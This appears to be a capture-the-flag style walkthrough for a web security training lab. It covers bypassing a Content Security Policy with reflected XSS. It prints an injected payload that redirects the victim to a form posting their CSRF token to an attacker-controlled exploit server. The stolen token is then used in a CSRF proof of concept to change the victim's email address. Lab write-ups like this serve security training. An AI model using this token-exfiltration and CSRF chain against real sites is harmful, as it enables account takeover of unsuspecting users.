## üõ°Ô∏è Exploiting CSP-Protected Labs with XSS

This lab employs a strict CSP that blocks outbound requests to external websites.

To solve the lab, you first need to perform an XSS attack that bypasses the CSP and exfiltrates the CSRF token of the simulated victim user using Burp Collaborator. Then, you must change the simulated user's email address to `hacker@evil-user.net`.

You should label your vector with the word "Click" to encourage the simulated user to click on it. For example:

```html
<a href="">Click me</a>
```

You can log in to your account using the following credentials: `wiener:peter`

### Steps:

1. **Log in** to the lab using the credentials provided above.

2. **Inspect the email change functionality** and note that the `email` parameter is vulnerable to XSS.

3. **Go to the exploit server** and add the following code, replacing `YOUR.LAB.URL` and `YOUR.EXPLOIT.URL` with your lab's URL and exploit server's identifier:

   ```html
   <script>
   window.location = "https://YOUR.LAB.URL/my-account?email=%22%3E%3C/form%3E%3Cform%20action=%22https://YOUR.EXPLOIT.URL/exploit%22%3E%3Cbutton%20type=%22Submit%22%3EClick me%3C/button%3E";
   </script>
   ```

4. **Save** the exploit and then **deliver** it to the victim. If the user visits the webpage containing this malicious script and clicks the "Click me" link while still logged into the lab, their browser will send a request containing their CSRF token to your malicious website.

5. **Retrieve the CSRF token** from the "Logs" section on the exploit server.

6. **Enable Burp's intercept feature** and return to the lab's email change functionality. Submit a request to change the email address to any random value.

7. **In Burp**, modify the intercepted request:
   - Change the `email` parameter value to `any@domain.com`.

8. **Generate a CSRF PoC**:
   - Right-click on the request and select **Engagement tools > Generate CSRF PoC**.
   - Replace the CSRF token in the request with the token you previously exfiltrated.

9. **Regenerate the CSRF HTML**:
   - Click "Regenerate" to update the CSRF HTML with the stolen token, then click "Copy HTML" to save it to your clipboard.

10. **Cancel the request** and turn off Burp's intercept feature.

11. **Return to the exploit server** and paste the CSRF HTML into the body, overwriting the script you entered earlier.

12. **Save** the exploit and **deliver** it to the victim. The user's email address will be changed to `any@domain.com`.
